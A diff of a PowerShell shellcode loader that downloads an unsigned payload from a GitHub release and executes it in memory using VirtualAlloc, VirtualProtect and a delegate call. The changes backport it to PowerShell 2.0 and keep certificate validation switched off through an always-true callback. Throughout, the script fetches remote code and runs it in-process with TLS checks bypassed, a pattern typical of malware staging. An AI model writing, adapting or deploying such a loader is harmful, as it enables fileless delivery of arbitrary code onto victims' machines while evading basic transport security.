@@ -7,7 +7,7 @@
     it in-process via function pointer (VirtualAlloc RW, copy, VirtualProtect RX,
     invoke as delegate). Architecture is auto-detected from the running process.
 
-    Requires PowerShell 5.1+ (Desktop) or PowerShell 7+ (Core).
+    Requires PowerShell 2.0+.
 
 .PARAMETER Tag
     GitHub release tag to download. Defaults to "preview".
@@ -66,6 +66,11 @@ public static class Win32 {
     [return: MarshalAs(UnmanagedType.Bool)]
     public static extern bool VirtualProtect(
         IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    public static bool ValidateCert(object s,
+        System.Security.Cryptography.X509Certificates.X509Certificate c,
+        System.Security.Cryptography.X509Certificates.X509Chain ch,
+        System.Net.Security.SslPolicyErrors e) { return true; }
 }
 '@
 
@@ -81,7 +86,7 @@ function Write-Log {
     )
 
     $timestamp = Get-Date -Format 'HH:mm:ss'
-    $prefix = if ($Level -eq 'OK') { '[INF]' } else { "[$Level]" }
+    if ($Level -eq 'OK') { $prefix = '[INF]' } else { $prefix = "[$Level]" }
 
     $colors = @{
         'DBG' = 'DarkGray'
@@ -150,8 +155,10 @@ function Get-Payload {
     # we download unsigned payload from public GitHub Releases.
     $prevCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback
     try {
-        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
-        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = `
+            New-Object System.Net.Security.RemoteCertificateValidationCallback([Win32], 'ValidateCert')
+        # TLS 1.2 = 3072; use integer cast because the enum name may not exist on .NET 3.5
+        try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]3072 } catch {}
 
         $webClient = New-Object System.Net.WebClient
         $webClient.Headers.Add('User-Agent', 'PIA-Loader/1.0')
@@ -199,7 +206,7 @@ function Get-Payload {
 function Invoke-Payload {
     param([byte[]]$Data)
 
-    $size = [UIntPtr]::new($Data.Length)
+    $size = New-Object UIntPtr([uint32]$Data.Length)
 
     Write-Log 'INF' "VirtualAlloc: size=$($Data.Length) protect=PAGE_READWRITE (0x04)"
     $mem = [Win32]::VirtualAlloc(
